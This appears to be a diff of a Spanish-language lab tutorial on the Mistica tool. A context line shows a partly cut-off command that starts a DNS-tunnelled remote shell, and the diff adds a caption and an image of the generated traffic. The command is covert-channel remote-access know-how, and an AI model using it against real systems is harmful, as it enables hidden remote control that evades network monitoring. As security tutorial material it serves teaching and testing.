@@ -317,3 +317,7 @@ python.exe C:\Users\Sergio\Downloads\Mistica-master\mc.py -m shell:dns -w "--hos
 Podremos ejecutar commandos de manera remota en nuestro parrot:
 
 ![image134.png]({{site.baseurl}}/images/Mistica/image134.png
+
+El tráfico generado:
+
+![image135.png]({{site.baseurl}}/images/Mistica/image135.png
